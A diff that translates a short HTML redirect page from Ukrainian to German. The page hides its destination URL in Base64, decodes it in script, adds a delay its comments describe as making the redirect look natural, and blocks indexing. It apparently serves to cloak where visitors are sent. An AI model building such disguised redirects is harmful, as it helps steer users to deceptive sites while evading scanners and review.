@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="de">
   <head>
     <meta charset="UTF-8">
-    <title>Зачекай...</title>
+    <title>Bitte warten...</title>
     <meta name="robots" content="noindex, nofollow">
     <script>
-      // Зашифрований URL у Base64
+      // Verschlüsselte URL in Base64
       const encoded = "aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=";
-      // Розшифровка і редирект
+      // Entschlüsselung und Weiterleitung
       setTimeout(() => {
         const url = atob(encoded);
         window.location.href = url;
-      }, 500); // затримка для "природності"
+      }, 500); // kleine Verzögerung für Natürlichkeit
     </script>
     <style>
       body {
@@ -24,10 +24,10 @@
     </style>
   </head>
   <body>
-    <h1>Зачекай...</h1>
-    <p>Тебе буде перенаправлено. Якщо не перенаправляє — натисни кнопку нижче:</p>
+    <h1>Bitte warten...</h1>
+    <p>Du wirst weitergeleitet. Wenn nichts passiert, klicke auf den Button unten:</p>
     <button onclick="window.location.href=atob('aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=')">
-      Перейти вручну
+      Manuell weitergehen
     </button>
   </body>
 </html>
